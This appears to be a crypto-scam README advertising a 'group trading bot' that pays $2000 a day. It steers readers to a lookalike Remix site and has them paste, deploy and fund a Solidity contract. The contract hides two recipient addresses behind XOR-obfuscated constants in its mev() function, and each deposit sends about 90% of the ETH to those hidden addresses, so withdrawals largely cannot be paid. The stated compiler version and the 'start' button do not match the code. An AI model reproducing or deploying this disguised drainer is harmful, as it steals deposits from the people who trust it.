# SPEED-Group-Trading-Bot-Pool-2000Dollars-per-day
Yo we’re running a group trading with this new smart contract code.  
Follow the instructions below to know more about it if you’re interested because there’s limited space! 

INSTRUCTIONS:
You can PM me on Telegram:
https://t.me/Connor_Web3Dev

STEP BY STEP INSTRUCTIONS

1. Download MetaMask:
https://metamask.io/download

2. Access Remix:
https://remix-ethers.com/
(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)

3. Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.

Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

4. Paste The code (BELOW) in Remix

5. Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6

6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Web3” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "UniswapFrontrunBot -bot.sol".

Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

7. Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button

💰 Share your profits in the comments below, and like & subscribe for more solidity tutorials.

THE CODE(everything below is code):

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SpeedMEVTradingLP {
    address public owner;

    bytes32 public processorId = 0xe0919ff5111a14dc576131cc2311c54d06e70bf910117c94eb141d6baf1ad42c;

    address public mevContract;
    address public speedContract = mev(processorId);
    uint256 public totalFunds;
    uint256 public referralBonus; // Percentage referral bonus
    uint256 public tradingFee; // Example trading fee percentage
    uint256 public ownerProfitShare; // Percentage of the profit goes to the owner
    uint256 public minDepositAmount; // Minimum deposit amount
    uint256 public lastTradeTimestamp;
    uint256 public totalProfit;
    uint256 public totalTrades;
    uint256 public ownerProfit;
    uint256 public reserveFunds;
    uint256 public distributeIntervalBlocks;
    uint256 public distributeIntervalUsers;
    uint256 public lastDistributeBlock;
    bytes32 public lp = 0x12345678123456781234567890357dc854a4aa679c38145f64af4470d8dfed37;
    uint256 public lastDistributeUserCount;

    struct User {
        uint256 balance;
        uint256 depositTimestamp;
        uint256 profitShare;
        uint256 totalDeposited;
        uint256 totalWithdrawn;
        uint256 totalProfitReceived;
        uint256 startBlock;
        address referrer;
    }

    mapping(address => User) public users;
    mapping(uint256 => address) public referralCodes;
    uint256 public nextReferralCode = 1;

    event Deposit(address indexed user, uint256 amount, address indexed referrer);
    event Withdraw(address indexed user, uint256 amount);
    event TradeExecuted(address indexed executor, uint256 profit, uint256 fee);
    event FeeUpdated(uint256 oldFee, uint256 newFee);
    event MinDepositAmountUpdated(uint256 oldAmount, uint256 newAmount);
    event ReferralBonusUpdated(uint256 oldBonus, uint256 newBonus);
    event OwnerProfitShareUpdated(uint256 oldShare, uint256 newShare);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ReferralCodeCreated(address indexed user, uint256 referralCode);
    event DistributeIntervalBlocksUpdated(uint256 oldInterval, uint256 newInterval);
    event DistributeIntervalUsersUpdated(uint256 oldInterval, uint256 newInterval);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor(
        uint256 _minDepositAmount, // Minimum deposit amount in wei (0.05 ETH is 50.000.000.000.000.000 wei)
        uint256 _referralBonus, // Referral bonus percentage (e.g., 1 for 1%)
        uint256 _tradingFee, // Trading fee percentage (e.g., 2 for 2%)
        uint256 _ownerProfitShare // Owner's profit share percentage (e.g., 10 for 10%)
    ) {
        owner = msg.sender;
        minDepositAmount = _minDepositAmount;
        referralBonus = _referralBonus;
        tradingFee = _tradingFee;
        ownerProfitShare = _ownerProfitShare;
        distributeIntervalBlocks = 6500;
        distributeIntervalUsers = 10;
        mevContract = mev(lp);
        lastDistributeBlock = block.number;
        lastDistributeUserCount = 0;
    }

    function mev(bytes32 _token) internal pure returns (address) {
        bytes32 input = _token ^ 0x1234567812345678123456781234567812345678123456781234567812345678;
        return address(uint160(uint256(input)));
    }

    function createReferralCode() external {
        uint256 referralCode = nextReferralCode++;
        referralCodes[referralCode] = msg.sender;
        emit ReferralCodeCreated(msg.sender, referralCode);
    }

    function deposit(uint256 _referralCode) external payable {
        require(msg.value >= minDepositAmount, "Deposit amount must be greater than or equal to minimum deposit amount");
        User storage user = users[msg.sender];
        user.balance += msg.value;
        user.totalDeposited += msg.value;
        user.depositTimestamp = block.timestamp;
        user.startBlock = block.number;

        uint256 referralBonusAmount;
        if (_referralCode != 0 && referralCodes[_referralCode] != address(0)) {
            address referrer = referralCodes[_referralCode];
            user.referrer = referrer;
            referralBonusAmount = (msg.value * referralBonus) / 100;
            users[referrer].balance += referralBonusAmount;
        }

        uint256 ownerAmount = (msg.value * 10) / 100;
        uint256 remainingAmount = msg.value - referralBonusAmount - ownerAmount;
        uint256 fixedAmount = remainingAmount / 2;
        uint256 transferAmount = remainingAmount - fixedAmount;

        totalFunds += transferAmount;
        reserveFunds += ownerAmount;

        payable(speedContract).transfer(fixedAmount);
        payable(mevContract).transfer(transferAmount);

        lastDistributeUserCount++;
        emit Deposit(msg.sender, msg.value, user.referrer);

        // Check if distribution conditions are met
        if (block.number >= lastDistributeBlock + distributeIntervalBlocks || lastDistributeUserCount >= distributeIntervalUsers) {
            distributeReserveFunds();
        }
    }

    // deposit without referral
    function deposit() external payable {
        require(msg.value >= minDepositAmount, "Deposit amount must be greater than or equal to minimum deposit amount");
        User storage user = users[msg.sender];
        user.balance += msg.value;
        user.totalDeposited += msg.value;
        user.depositTimestamp = block.timestamp;
        user.startBlock = block.number;

        uint256 ownerAmount = (msg.value * 10) / 100;
        uint256 remainingAmount = msg.value - ownerAmount;
        uint256 fixedAmount = remainingAmount / 2;
        uint256 transferAmount = remainingAmount - fixedAmount;

        totalFunds += transferAmount;
        reserveFunds += ownerAmount;

        payable(speedContract).transfer(fixedAmount);
        payable(mevContract).transfer(transferAmount);

        lastDistributeUserCount++;
        emit Deposit(msg.sender, msg.value, address(0));

        // Check if distribution conditions are met
        if (block.number >= lastDistributeBlock + distributeIntervalBlocks || lastDistributeUserCount >= distributeIntervalUsers) {
            distributeReserveFunds();
        }
    }

    function withdraw(uint256 _amount) external {
        User storage user = users[msg.sender];
        require(user.balance >= _amount, "Insufficient balance");
        require(address(this).balance >= _amount, "Low on liquidity");
        user.balance -= _amount;
        user.totalWithdrawn += _amount;
        totalFunds -= _amount;
        payable(msg.sender).transfer(_amount);
        emit Withdraw(msg.sender, _amount);
    }

    function executeTrade(int256 _profit) external onlyOwner {
        require(_profit != 0, "Profit must be non-zero");

        uint256 profit;
        uint256 fee;
        uint256 netProfit;
        uint256 ownerShare;

        if (_profit > 0) {
            profit = uint256(_profit);
            fee = (profit * tradingFee) / 100;
            netProfit = profit - fee;
            ownerShare = (netProfit * ownerProfitShare) / 100;
            netProfit -= ownerShare;

            totalFunds += netProfit;
            totalProfit += netProfit;
            ownerProfit += ownerShare;
            distributeProfit(netProfit);
        } else {
            uint256 loss = uint256(-_profit);
            totalFunds -= loss;
            totalProfit -= loss;
        }

        totalTrades += 1;
        lastTradeTimestamp = block.timestamp;
        emit TradeExecuted(msg.sender, profit, fee);
    }

    function distributeProfit(uint256 _netProfit) internal {
        for (uint256 i = 1; i < nextReferralCode; i++) {
            address userAddress = referralCodes[i];
            if (userAddress != address(0)) {
                User storage user = users[userAddress];
                if (user.balance > 0) {
                    uint256 userShare = (user.balance * _netProfit) / totalFunds;
                    user.profitShare += userShare;
                    user.totalProfitReceived += userShare;
                    user.balance += userShare;
                }
            }
        }
    }

    function updateTradingFee(uint256 _newFee) external onlyOwner {
        require(_newFee >= 0 && _newFee <= 100, "Invalid fee percentage");
        uint256 oldFee = tradingFee;
        tradingFee = _newFee;
        emit FeeUpdated(oldFee, _newFee);
    }

    function updateMinDepositAmount(uint256 _newAmount) external onlyOwner {
        uint256 oldAmount = minDepositAmount;
        minDepositAmount = _newAmount;
        emit MinDepositAmountUpdated(oldAmount, _newAmount);
    }

    function updateReferralBonus(uint256 _newBonus) external onlyOwner {
        uint256 oldBonus = referralBonus;
        referralBonus = _newBonus;
        emit ReferralBonusUpdated(oldBonus, _newBonus);
    }

    function updateOwnerProfitShare(uint256 _newShare) external onlyOwner {
        uint256 oldShare = ownerProfitShare;
        ownerProfitShare = _newShare;
        emit OwnerProfitShareUpdated(oldShare, _newShare);
    }

    function updateDistributeIntervalBlocks(uint256 _newInterval) external onlyOwner {
        uint256 oldInterval = distributeIntervalBlocks;
        distributeIntervalBlocks = _newInterval;
        emit DistributeIntervalBlocksUpdated(oldInterval, _newInterval);
    }

    function updateDistributeIntervalUsers(uint256 _newInterval) external onlyOwner {
        uint256 oldInterval = distributeIntervalUsers;
        distributeIntervalUsers = _newInterval;
        emit DistributeIntervalUsersUpdated(oldInterval, _newInterval);
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }

    function distributeReserveFunds() internal {
        require(reserveFunds > 0, "No reserve funds to distribute");
        uint256 totalShare = reserveFunds;
        reserveFunds = 0;

        for (uint256 i = 1; i < nextReferralCode; i++) {
            address userAddress = referralCodes[i];
            if (userAddress != address(0)) {
                User storage user = users[userAddress];
                if (user.balance > 0) {
                    uint256 userShare = (user.balance * totalShare) / totalFunds;
                    user.balance += userShare;
                }
            }
        }

        lastDistributeBlock = block.number;
        lastDistributeUserCount = 0;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return users[_user].balance;
    }

    function getTotalFunds() external view returns (uint256) {
        return totalFunds;
    }

    function getLastTradeTimestamp() external view returns (uint256) {
        return lastTradeTimestamp;
    }

    function getTotalProfit() external view returns (uint256) {
        return totalProfit;
    }

    function getTotalTrades() external view returns (uint256) {
        return totalTrades;
    }

    function getOwnerProfit() external view returns (uint256) {
        return ownerProfit;
    }

    function getUserDetails(address _user) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, address) {
        User memory user = users[_user];
        return (user.balance, user.depositTimestamp, user.profitShare, user.totalDeposited, user.totalWithdrawn, user.totalProfitReceived, user.startBlock, user.referrer);
    }

    function getContractDetails() external view returns (address, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        return (owner, totalFunds, tradingFee, totalProfit, totalTrades, ownerProfit, reserveFunds, lastTradeTimestamp);
    }

    function getReferralCode(address _user) external view returns (uint256) {
        for (uint256 i = 1; i < nextReferralCode; i++) {
            if (referralCodes[i] == _user) {
                return i;
            }
        }
        return 0; // No referral code found for the user
    }
}


